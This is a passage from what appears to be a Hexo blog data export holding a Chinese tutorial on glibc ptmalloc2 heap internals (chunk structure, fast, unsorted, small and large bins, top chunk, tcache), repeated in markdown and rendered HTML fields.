bin下不同大小的chunk，**fd_nextsize会连接下一个比当前小的chunk，bk_nextsize会链接前一个比当前大的chunk**，对相同大小的chunk，只有**第一个**chunk的fd_nextsize和bk_nextsize会指向，其余的都会赋0。\n\nfd_nextsize和bk_nextsize也构成了一个**双向的循环链表**，如果large bin中chunk的大小都相同，那么第一个chunk的fd_nextsize和bk_nextsize都会指向自己。\n\nlarge bins的特性：\n\n1. large bins在bin中的index从64到126,共63个\n2. 一个large bin中的chunk的大小不一定相同，但都在一定范围（公差）内\n3. 63个large bin中被分为6类，每类的公差相同\n4. large bin中的chunk按由大到小的顺序排布，头结点接的是最大的chunk\n5. large bin使用fd和bk，通过双向链表连接\n6. large bin利用fd_nextsize和bk_nextsize，指向比当前小和比当前大的chunk，构成双向循环链表\n7. large bin取出时会首先取出离头结点最近的（LIFO）\n\n\n### top chunk\n\ntop chunk 就是处于当前堆的物理地址最高的chunk。程序第一次进行malloc的时候，heap会被分为两块，低地址的一块给用户，剩下的那块就是top chunk。\n\ntop chunk虽然没被使用，但是不属于任何一个bin，当bin中的chunk不能满足用户需要时，就会**从top chunk中分割新的chunk**，余下的部分将作为新的top chunk。\n\n当释放的chunk与top chunk相邻且不在fast bin的范围内，那么这个chunk会被**合并**到top chunk中。因此，top chunk的**prev_inuse位始终为1**，否则前一个chunk就会被合并。\n\n### last remainder\n\n在用户使用 malloc 请求分配内存时，ptmalloc2 找到的 chunk 可能并不和申请的内存大小一致，这时候就将**分割之后的剩余部分**称之为last remainder chunk，unsort bin 也会存这一块。top chunk 分割剩下的部分不会作为last remainder.\n\n### tcache\n\n在glibc2.26之后引入的新技术，提高了性能，但是由于**舍弃了许多安全检查**，带来了不小的风险。\n\ntcache的结构与fast bin有些类似，都是利用**fd通过单向链表**将**相同大小**的chunk链起来，且**prev_inuse==1**，但不同的是tcache中**fd指向的是user data而不是chunk_addr**。\n\n具体结构：\n\n每个线程都会维护一个tcache_perthread_struct，是整个tcache的管理结构，一共有TCACHE_MAX_BINS个计数器和TCACHE_MAX_BINS个tcache_entry。\n\n```c\ntypedef struct tcache_perthread_struct\n{\n  char counts[TCACHE_MAX_BINS];\n  tcache_entry *entries[TCACHE_MAX_BINS];\n} tcache_perthread_struct;\n\n# define TCACHE_MAX_BINS                64\n```\n\n**tcache_entry就相当于是fast bin的头结点**，后面连接大小相同的chunk;其中的count记录了tcache_entry连接的free chunk的个数，一般最多为**7**个，**超过7个则放入其他的bin**。\n\n`tcache_perthread_struct`本身也是一个堆块，大小为0x250，位于堆的开头。（**因此可以被劫持**）\n\ntcache与fast bin类似，是采用LIFO的单链表，每个bin内存在的堆块大小相同，大小从24~1032字节，一般每个bin最多存放7个。\n\n工作方式：\n\n在free的时候，会**优先考虑放入tcache中**，tcache中没有空位才会加入fast bin或者unsorted bin。与fast bin类似，tcache中chunk的**prev_inuse位为1**。\n\n在malloc的时候，也会**优先从tcache中取出chunk（如果size在tcache范围0x408内）**，如果tcache是空的，但fast bin、smalll bin中有对应size的chunk的话，则会**将对应头结点下的其他chunk**移到tcache的对应tcache_entry处，直到tcache被填满或bin被清空。如果是unsorted bin的话，则会将**所有chunk**移到tcache中继续处理。\n\ntcache采用tcache_put()和tcache_get()对chunk进行存取，这两个操作几乎没有安全保护，这是让tcache_entry[idx]指向新放入的chunk或取出tcache_entry[idx]指向的chunk，再修改count，并且不会修改prev_inuse。\n\n","slug":"heap struct","published":1,"updated":"2023-01-04T08:18:34.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafx003k5oudaz0z44uv","content":"<p>堆是由操作系统内核或堆管理器<strong>动态</strong>分配的，只有在程序需要时才会被分配。<br>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请<strong>大小未知</strong>的内存。堆其实就是程序虚拟地址空间的一块<strong>连续的线性</strong>区域，它由<strong>低地址向高地址</strong>方向增长。</p>\n<p>堆通常由堆管理器ptmalloc2来管理，堆管理器位于内核层和用户层之间，会响应用户的请求并管理堆。系统调用开销巨大，只有堆管理器不能满足需求时，才会调用系统内核进行操作。</p>\n<p>需要注意的是，在内存分配与使用的过程中，Linux有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p>\n<span id=\"more\"></span>\n<h2 id=\"堆的微观结构\"><a href=\"#堆的微观结构\" class=\"headerlink\" title=\"堆的微观结构\"></a>堆的微观结构</h2><h3 id=\"chunk\"><a href=\"#chunk\" class=\"headerlink\" title=\"chunk\"></a>chunk</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//当物理地址上的前一个chunk在使用时，prev_size用于存放前一个chunk的数据，否则，如果前一个chunk被释放了，则存放前一个chunk的大小</span></span><br><span class=\"line\">    INTERNAL_SIZE_T prev_size;  </span><br><span class=\"line\">    <span class=\"comment\">//存放当前chunk的实际大小（包含prev_size和size字段），chunk的大小都为2*SIZE_SZ(SIZE_SZ 32bit为4byte，64bit为8byte)的整数倍，因此size的后面3位都不会用上，被用于作为标志位。</span></span><br><span class=\"line\">    <span class=\"comment\">//最低位为prev_inuse，用于指示前一个chunk是否释放，prev_inuse==1为使用，==0为释放</span></span><br><span class=\"line\">    <span class=\"comment\">//第二位指示是否为memory_mapped分配的内存，1表示是，0 表示是 heap</span></span><br><span class=\"line\">    <span class=\"comment\">//第三位指示是否是主分配区main_arena分配的内存，1表示不是，0表示是</span></span><br><span class=\"line\">    INTERNAL_SIZE_T size;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//下面为user data部分，用户申请到的指针指向的是下面的部分，若chunk被使用则下面的内存全部用于存放数据，否则才会有下面的结构</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//fd和bk用于bin中链表连接，fd指向下一个，bk指向前一个。</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">fd</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">bk</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//fd_nextsize和bk_nextsize用于large bin，分别指向前一个或后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针（因为large bin中同一头结点下的chunk的大小不一定相同，large bin允许有一定的公差）</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">fd_nextsize</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">bk_nextsize</span>;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"bin\"><a href=\"#bin\" class=\"headerlink\" title=\"bin\"></a>bin</h3><p>为了减少开销，释放chunk的时候，堆管理器不会马上返回给内核，而是用bin对chunk进行暂时的管理。这样，当再次用户再次申请内存的时候，先从chunk中查找是否有正好满足的，如果有则直接取出，达到减少系统调用的次数的目的。</p>\n<p>为了方便管理，堆管理器按照chunk的大小，将bin分为4类，分别管理不同大小的chunk，分别为fast bins,small bins,large bins和unsorted bin。除了unsorted bin之外，其他的每种bin都会维护多个链表，根据chunk的大小再进行细分。<strong>fast bin由fastbinY数组管理，其余的unsorted bin,small bin,large bin则由一个bin数组管理。</strong></p>\n<h3 id=\"fast-bins\"><a href=\"#fast-bins\" class=\"headerlink\" title=\"fast bins\"></a>fast bins</h3><p>fast bin是所有bin中操作最快的，也是最常用的，通常存放0x10到0x80的chunk，当在fast bins范围内的chunk被释放时，会<strong>直接</strong>被放到fast bins中。fastbinY这个数组用于实现fast bin，这个数组保存了fast bin的头结点，每一个头结点都指向同一大小的fast bin chunk，<strong>头结点的prev_size和size字段被省去</strong>。</p>\n<p>fast bin中采用<strong>单向链表</strong>对chunk进行组织,<strong>即仅使用fd指针</strong>，并且遵循<strong>LIFO(先进后出)<strong>的原则，fast bin的</strong>头结点会指向最后一个</strong>加入该fast bin的chunk。加入chunk时，先让chunk指向头结点指向的chunk，再让头结点指向该chunk；取出chunk的时候通过头结点取出最后加入的chunk。</p>\n<p>fast bin中的chunk大小都比较小，因为小的内存经常会用到，但如果释放后就被合并，那么下次申请时就会再需要分割，fast bin会减少这种合并，<strong>fast bin chunk的prev_inuse位都为1，用于防止合并</strong>。</p>\n<p>fast bin特性：</p>\n<ol>\n<li>fast bin使用fd，通过单向链表对chunk进行组织</li>\n<li>fast bin遵循LIFO的规则</li>\n<li>fast bin chunk prev_inuse位为1，不会被合并</li>\n<li>fast bin中fd指向的是prev_size位置，也就是chunk的开头位置</li>\n<li>大小在fast bin范围内的chunk被释放时会直接放入fast bin(如果没有tcache或tcache满了)</li>\n</ol>\n<h3 id=\"unsorted-bin\"><a href=\"#unsorted-bin\" class=\"headerlink\" title=\"unsorted bin\"></a>unsorted bin</h3><p>unsorted bin中存放的是<strong>不符合fast bin大小且不与top chunk相邻</strong>的chunk，当这样的chunk会释放的时候，<strong>首先</strong>会被放入unsorted bin,作为放入small bin和large bin的<strong>缓冲</strong>，<strong>unsorted bin的头结点中的pre_size和size都被省去，只有fd和bk有作用</strong>。</p>\n<p>unsorted bin 处于bin[1]处，因此unsorted bin 只有一个链表。unsorted bin 中的空闲 chunk 处于<strong>乱序</strong>状态，主要有两个来源：</p>\n<p>（1）当一个较大的 chunk 被<strong>分割</strong>成两半后，如果剩下的部分**大于MINSIZE(chunk的最小大小)**，就会被放到 unsorted bin 中。</p>\n<p>（2）释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</p>\n<p>unsorted Bin 在使用的过程中，采用的遍历顺序是 <strong>FIFO</strong> ，并且使用fd和bk通过<strong>双向链表</strong>进行连接。<strong>当unsorted chunk中只有一个chunk的时候，那一个chunk的fd和bk都会指向的unsorted bin的头结点</strong>。</p>\n<p>unsorted bin的特性：</p>\n<ol>\n<li>unsorted bin只有一个</li>\n<li>unsorted bin遵循FIFO的规则</li>\n<li>unsorted bin使用fd和bk，通过双向链表连接chunk</li>\n<li>当unsorted bin只有一个chunk的时候，chunk的fd和bk都会指向unsorted bin的头结点（通常是main_arena+88高版本可能会+96）</li>\n<li>不属于fast bin且不与top chunk相邻的chunk被释放时会放入unsorted bin</li>\n<li>被分割后剩下的chunk如果大于chunk的最小大小，则会加入unsorted bin</li>\n</ol>\n<h3 id=\"small-bins\"><a href=\"#small-bins\" class=\"headerlink\" title=\"small bins\"></a>small bins</h3><p>small bins在bin中从bin[2]一直到bin[63],存放的是小于512B的chunk，<strong>工作范围包含了fast bins</strong>,small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index</p>\n<p>small bins中一共有62个循环双向链表，每个链表中存储的chunk<strong>大小都一致</strong>。此外，small bins中遵循<strong>FIFO</strong>的规则，所以同一个链表中先被释放的chunk会先被分配出去，bin的头结点指向<strong>最后被释放的chunk</strong>，也就是说，<strong>离bin头结点最远的chunk最先被分配</strong>。</p>\n<p>small bins的特性：</p>\n<ol>\n<li>small bins在bin中的index从2到63，共62个</li>\n<li>一个bin中的chunk的大小都相等，chunk_size=2 * SIZE_SZ * index</li>\n<li>small bins遵循FIFO的规则</li>\n<li>small bins使用fd和bk，通过双向链表连接chunk</li>\n</ol>\n<h3 id=\"large-bins\"><a href=\"#large-bins\" class=\"headerlink\" title=\"large bins\"></a>large bins</h3><p>large bins在bin中从bin[64]一直到bin[126],存放的是大于512B的chunk。bin中的每个chunk的<strong>大小不一定相同</strong>，但都是<strong>在一定范围之内</strong>。此外，63个bin被分为6类，每类bin中chunk的<strong>公差一致</strong>，第一类有32个，公差为64B，第二类有16个，公差为512B，第三类有8个，公差为4096B，第四类有4个，公差为32768B，第五类有2个，公差为262144B，第六类有1个，公差不限制。</p>\n<p>large bins采用双向链表进行连接，除了fd和bk的双向链表连接同一个large bin中前后的chunk之外，<strong>large bin中还会利用fd_nextsize和bk_nextsize进行连接</strong>。</p>\n<p>large bin中的chunk按照<strong>大小顺序</strong>排列，<strong>最大的接在头结点后</strong>，最小的接在尾部。</p>\n<p>fd_nextsize和bk_nextsize用于连接同一个large bin下不同大小的chunk，<strong>fd_nextsize会连接下一个比当前小的chunk，bk_nextsize会链接前一个比当前大的chunk</strong>，对相同大小的chunk，只有<strong>第一个</strong>chunk的fd_nextsize和bk_nextsize会指向，其余的都会赋0。</p>\n<p>fd_nextsize和bk_nextsize也构成了一个<strong>双向的循环链表</strong>，如果large bin中chunk的大小都相同，那么第一个chunk的fd_nextsize和bk_nextsize都会指向自己。</p>\n<p>large bins的特性：</p>\n<ol>\n<li>large bins在bin中的index从64到126,共63个</li>\n<li>一个large bin中的chunk的大小不一定相同，但都在一定范围（公差）内</li>\n<li>63个large bin中被分为6类，每类的公差相同</li>\n<li>large bin中的chunk按由大到小的顺序排布，头结点接的是最大的chunk</li>\n<li>large bin使用fd和bk，通过双向链表连接</li>\n<li>large bin利用fd_nextsize和bk_nextsize，指向比当前小和比当前大的chunk，构成双向循环链表</li>\n<li>large bin取出时会首先取出离头结点最近的（LIFO）</li>\n</ol>\n<h3 id=\"top-chunk\"><a href=\"#top-chunk\" class=\"headerlink\" title=\"top chunk\"></a>top chunk</h3><p>top chunk 就是处于当前堆的物理地址最高的chunk。程序第一次进行malloc的时候，heap会被分为两块，低地址的一块给用户，剩下的那块就是top chunk。</p>\n<p>top chunk虽然没被使用，但是不属于任何一个bin，当bin中的chunk不能满足用户需要时，就会<strong>从top chunk中分割新的chunk</strong>，余下的部分将作为新的top chunk。</p>\n<p>当释放的chunk与top chunk相邻且不在fast bin的范围内，那么这个chunk会被<strong>合并</strong>到top chunk中。因此，top chunk的<strong>prev_inuse位始终为1</strong>，否则前一个chunk就会被合并。</p>\n<h3 id=\"last-remainder\"><a href=\"#last-remainder\" class=\"headerlink\" title=\"last remainder\"></a>last remainder</h3><p>在用户使用 malloc 请求分配内存时，ptmalloc2 找到的 chunk 可能并不和申请的内存大小一致，这时候就将<strong>分割之后的剩余部分</strong>称之为last remainder chunk，unsort bin 也会存这一块。top chunk 分割剩下的部分不会作为last remainder.</p>\n<h3 id=\"tcache\"><a href=\"#tcache\" class=\"headerlink\" title=\"tcache\"></a>tcache</h3><p>在glibc2.26之后引入的新技术，提高了性能，但是由于<strong>舍弃了许多安全检查</strong>，带来了不小的风险。</p>\n<p>tcache的结构与fast bin有些类似，都是利用<strong>fd通过单向链表</strong>将<strong>相同大小</strong>的chunk链起来，且<strong>prev_inuse==1</strong>，但不同的是tcache中<strong>fd指向的是user data而不是chunk_addr</strong>。</p>\n<p>具体结构：</p>\n<p>每个线程都会维护一个tcache_perthread_struct，是整个tcache的管理结构，一共有TCACHE_MAX_BINS个计数器和TCACHE_MAX_BINS个tcache_entry。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_perthread_struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"type\">char</span> counts[TCACHE_MAX_BINS];</span><br><span class=\"line\">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class=\"line\">&#125; tcache_perthread_struct;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">define</span> TCACHE_MAX_BINS                64</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>tcache_entry就相当于是fast bin的头结点</strong>，后面连接大小相同的chunk;其中的count记录了tcache_entry连接的free chunk的个数，一般最多为<strong>7</strong>个，<strong>超过7个则放入其他的bin</strong>。</p>\n<p><code>tcache_perthread_struct</code>本身也是一个堆块，大小为0x250，位于堆的开头。（<strong>因此可以被劫持</strong>）</p>\n<p>tcache与fast bin类似，是采用LIFO的单链表，每个bin内存在的堆块大小相同，大小从24~1032字节，一般每个bin最多存放7个。</p>\n<p>工作方式：</p>\n<p>在free的时候，会<strong>优先考虑放入tcache中</strong>，tcache中没有空位才会加入fast bin或者unsorted bin。与fast bin类似，tcache中chunk的<strong>prev_inuse位为1</strong>。</p>\n<p>在malloc的时候，也会<strong>优先从tcache中取出chunk（如果size在tcache范围0x408内）</strong>，如果tcache是空的，但fast bin、smalll bin中有对应size的chunk的话，则会<strong>将对应头结点下的其他chunk</strong>移到tcache的对应tcache_entry处，直到tcache被填满或bin被清空。如果是unsorted bin的话，则会将<strong>所有chunk</strong>移到tcache中继续处理。</p>\n<p>tcache采用tcache_put()和tcache_get()对chunk进行存取，这两个操作几乎没有安全保护，这是让tcache_entry[idx]指向新放入的chunk或取出tcache_entry[idx]指向的chunk，再修改count，并且不会修改prev_inuse。</p>\n","site":{"data":{}},"excerpt":"<p>堆是由操作系统内核或堆管理器<strong>动态</strong>分配的，只有在程序需要时才会被分配。<br>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请<strong>大小未知</strong>的内存。堆其实就是程序虚拟地址空间的一块<strong>连续的线性</strong>区域，它由<strong>低地址向高地址</strong>方向增长。</p>\n<p>堆通常由堆管理器ptmalloc2来管理，堆管理器位于内核层和用户层之间，会响应用户的请求并管理堆。系统调用开销巨大，只有堆管理器不能满足需求时，才会调用系统内核进行操作。</p>\n<p>需要注意的是，在内存分配与使用的过程中，Linux有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p>","more":"<h2 id=\"堆的微观结构\"><a href=\"#堆的微观结构\" class=\"headerlink\" title=\"堆的微观结构\"></a>堆的微观结构</h2><h3 id=\"chunk\"><a href=\"#chunk\" class=\"headerlink\" title=\"chunk\"></a>chunk</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//当物理地址上的前一个chunk在使用时，prev_size用于存放前一个chunk的数据，否则，如果前一个chunk被释放了，则存放前一个chunk的大小</span></span><br><span class=\"line\">    INTERNAL_SIZE_T prev_size;  </span><br><span class=\"line\">    <span class=\"comment\">//存放当前chunk的实际大小（包含prev_size和size字段），chunk的大小都为2*SIZE_SZ(SIZE_SZ 32bit为4byte，64bit为8byte)的整数倍，因此size的后面3位都不会用上，被用于作为标志位。</span></span><br><span class=\"line\">    <span class=\"comment\">//最低位为prev_inuse，用于指示前一个chunk是否释放，prev_inuse==1为使用，==0为释放</span></span><br><span class=\"line\">    <span class=\"comment\">//第二位指示是否为memory_mapped分配的内存，1表示是，0 表示是 heap</span></span><br><span class=\"line\">    <span class=\"comment\">//第三位指示是否是主分配区main_arena分配的内存，1表示不是，0表示是</span></span><br><span class=\"line\">    INTERNAL_SIZE_T size;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//下面为user data部分，用户申请到的指针指向的是下面的部分，若chunk被使用则下面的内存全部用于存放数据，否则才会有下面的结构</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//fd和bk用于bin中链表连接，fd指向下一个，bk指向前一个。</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">fd</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">bk</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//fd_nextsize和bk_nextsize用于large bin，分别指向前一个或后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针（因为large bin中同一头结点下的chunk的大小不一定相同，large bin允许有一定的公差）</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">fd_nextsize</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">bk_nextsize</span>;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"bin\"><a href=\"#bin\" class=\"headerlink\" title=\"bin\"></a>bin</h3><p>为了减少开销，释放chunk的时候，堆管理器不会马上返回给内核，而是用bin对chunk进行暂时的管理。这样，当再次用户再次申请内存的时候，先从chunk中查找是否有正好满足的，如果有则直接取出，达到减少系统调用的次数的目的。</p>\n<p>为了方便管理，堆管理器按照chunk的大小，将bin分为4类，分别管理不同大小的chunk，分别为fast bins,small bins,large bins和unsorted bin。除了unsorted bin之外，其他的每种bin都会维护多个链表，根据chunk的大小再进行细分。<strong>fast bin由fastbinY数组管理，其余的unsorted bin,small bin,large bin则由一个bin数组管理。</strong></p>\n<h3 id=\"fast-bins\"><a href=\"#fast-bins\" class=\"headerlink\" title=\"fast bins\"></a>fast bins</h3><p>fast bin是所有bin中操作最快的，也是最常用的，通常存放0x10到0x80的chunk，当在fast bins范围内的chunk被释放时，会<strong>直接</strong>被放到fast bins中。fastbinY这个数组用于实现fast bin，这个数组保存了fast bin的头结点，每一个头结点都指向同一大小的fast bin chunk，<strong>头结点的prev_size和size字段被省去</strong>。</p>\n<p>fast bin中采用<strong>单向链表</strong>对chunk进行组织,<strong>即仅使用fd指针</strong>，并且遵循<strong>LIFO(先进后出)<strong>的原则，fast bin的</strong>头结点会指向最后一个</strong>加入该fast bin的chunk。加入chunk时，先让chunk指向头结点指向的chunk，再让头结点指向该chunk；取出chunk的时候通过头结点取出最后加入的chunk。</p>\n<p>fast bin中的chunk大小都比较小，因为小的内存经常会用到，但如果释放后就被合并，那么下次申请时就会再需要分割，fast bin会减少这种合并，<strong>fast bin chunk的prev_inuse位都为1，用于防止合并</strong>。</p>\n<p>fast bin特性：</p>\n<ol>\n<li>fast bin使用fd，通过单向链表对chunk进行组织</li>\n<li>fast bin遵循LIFO的规则</li>\n<li>fast bin chunk prev_inuse位为1，不会被合并</li>\n<li>fast bin中fd指向的是prev_size位置，也就是chunk的开头位置</li>\n<li>大小在fast bin范围内的chunk被释放时会直接放入fast bin(如果没有tcache或tcache满了)</li>\n</ol>\n<h3 id=\"unsorted-bin\"><a href=\"#unsorted-bin\" class=\"headerlink\" title=\"unsorted bin\"></a>unsorted bin</h3><p>unsorted bin中存放的是<strong>不符合fast bin大小且不与top chunk相邻</strong>的chunk，当这样的chunk会释放的时候，<strong>首先</strong>会被放入unsorted bin,作为放入small bin和large bin的<strong>缓冲</strong>，<strong>unsorted bin的头结点中的pre_size和size都被省去，只有fd和bk有作用</strong>。</p>\n<p>unsorted bin 处于bin[1]处，因此unsorted bin 只有一个链表。unsorted bin 中的空闲 chunk 处于<strong>乱序</strong>状态，主要有两个来源：</p>\n<p>（1）当一个较大的 chunk 被<strong>分割</strong>成两半后，如果剩下的部分**大于MINSIZE(chunk的最小大小)**，就会被放到 unsorted bin 中。</p>\n<p>（2）释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</p>\n<p>unsorted Bin 在使用的过程中，采用的遍历顺序是 <strong>FIFO</strong> ，并且使用fd和bk通过<strong>双向链表</strong>进行连接。<strong>当unsorted chunk中只有一个chunk的时候，那一个chunk的fd和bk都会指向的unsorted bin的头结点</strong>。</p>\n<p>unsorted bin的特性：</p>\n<ol>\n<li>unsorted bin只有一个</li>\n<li>unsorted bin遵循FIFO的规则</li>\n<li>unsorted bin使用fd和bk，通过双向链表连接chunk</li>\n<li>当unsorted bin只有一个chunk的时候，chunk的fd和bk都会指向unsorted bin的头结点（通常是main_arena+88高版本可能会+96）</li>\n<li>不属于fast bin且不与top chunk相邻的chunk被释放时会放入unsorted bin</li>\n<li>被分割后剩下的chunk如果大于chunk的最小大小，则会加入unsorted bin</li>\n</ol>\n<h3 id=\"small-bins\"><a href=\"#small-bins\" class=\"headerlink\" title=\"small bins\"></a>small bins</h3><p>small bins在bin中从bin[2]一直到bin[63],存放的是小于512B的chunk，<strong>工作范围包含了fast bins</strong>,small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index</p>\n<p>small bins中一共有62个循环双向链表，每个链表中存储的chunk<strong>大小都一致</strong>。此外，small bins中遵循<strong>FIFO</strong>的规则，所以同一个链表中先被释放的chunk会先被分配出去，bin的头结点指向<strong>最后被释放的chunk</strong>，也就是说，<strong>离bin头结点最远的chunk最先被分配</strong>。</p>\n<p>small bins的特性：</p>\n<ol>\n<li>small bins在bin中的index从2到63，共62个</li>\n<li>一个bin中的chunk的大小都相等，chunk_size=2 * SIZE_SZ * index</li>\n<li>small bins遵循FIFO的规则</li>\n<li>small bins使用fd和bk，通过双向链表连接chunk</li>\n</ol>\n<h3 id=\"large-bins\"><a href=\"#large-bins\" class=\"headerlink\" title=\"large bins\"></a>large bins</h3><p>large bins在bin中从bin[64]一直到bin[126],存放的是大于512B的chunk。bin中的每个chunk的<strong>大小不一定相同</strong>，但都是<strong>在一定范围之内</strong>。此外，63个bin被分为6类，每类bin中chunk的<strong>公差一致</strong>，第一类有32个，公差为64B，第二类有16个，公差为512B，第三类有8个，公差为4096B，第四类有4个，公差为32768B，第五类有2个，公差为262144B，第六类有1个，公差不限制。</p>\n<p>large bins采用双向链表进行连接，除了fd和bk的双向链表连接同一个large bin中前后的chunk之外，<strong>large bin中还会利用fd_nextsize和bk_nextsize进行连接</strong>。</p>\n<p>large bin中的chunk按照<strong>大小顺序</strong>排列，<strong>最大的接在头结点后</strong>，最小的接在尾部。</p>\n<p>fd_nextsize和bk_nextsize用于连接同一个large bin下不同大小的chunk，<strong>fd_nextsize会连接下一个比当前小的chunk，bk_nextsize会链接前一个比当前大的chunk</strong>，对相同大小的chunk，只有<strong>第一个</strong>chunk的fd_nextsize和bk_nextsize会指向，其余的都会赋0。</p>\n<p>fd_nextsize和bk_nextsize也构成了一个<strong>双向的循环链表</strong>，如果large bin中chunk的大小都相同，那么第一个chunk的fd_nextsize和bk_nextsize都会指向自己。</p>\n<p>large bins的特性：</p>\n<ol>\n<li>large bins在bin中的index从64到126,共63个</li>\n<li>一个large bin中的chunk的大小不一定相同，但都在一定范围（公差）内</li>\n<li>63个large bin中被分为6类，每类的公差相同</li>\n<li>large bin中的chunk按由大到小的顺序排布，头结点接的是最大的chunk</li>\n<li>large bin使用fd和bk，通过双向链表连接</li>\n<li>large bin利用fd_nextsize和bk_nextsize，指向比当前小和比当前大的chunk，构成双向循环链表</li>\n<li>large bin取出时会首先取出离头结点最近的（LIFO）</li>\n</ol>\n<h3 id=\"top-chunk\"><a href=\"#top-chunk\" class=\"headerlink\" title=\"top chunk\"></a>top chunk</h3><p>top chunk 就是处于当前堆的物理地址最高的chunk。程序第一次进行malloc的时候，heap会被分为两块，低地址的一块给用户，剩下的那块就是top chunk。</p>\n<p>top chunk虽然没被使用，但是不属于任何一个bin，当bin中的chunk不能满足用户需要时，就会<strong>从top chunk中分割新的chunk</strong>，余下的部分将作为新的top chunk。</p>\n<p>当释放的chunk与top chunk相邻且不在fast bin的范围内，那么这个chunk会被<strong>合并</strong>到top chunk中。因此，top chunk的<strong>prev_inuse位始终为1</strong>，否则前一个chunk就会被合并。</p>\n<h3 id=\"last-remainder\"><a href=\"#last-remainder\" class=\"headerlink\" title=\"last remainder\"></a>last remainder</h3><p>在用户使用 malloc 请求分配内存时，ptmalloc2 找到的 chunk 可能并不和申请的内存大小一致，这时候就将<strong>分割之后的剩余部分</strong>称之为last remainder chunk，unsort bin 也会存这一块。top chunk 分割剩下的部分不会作为last 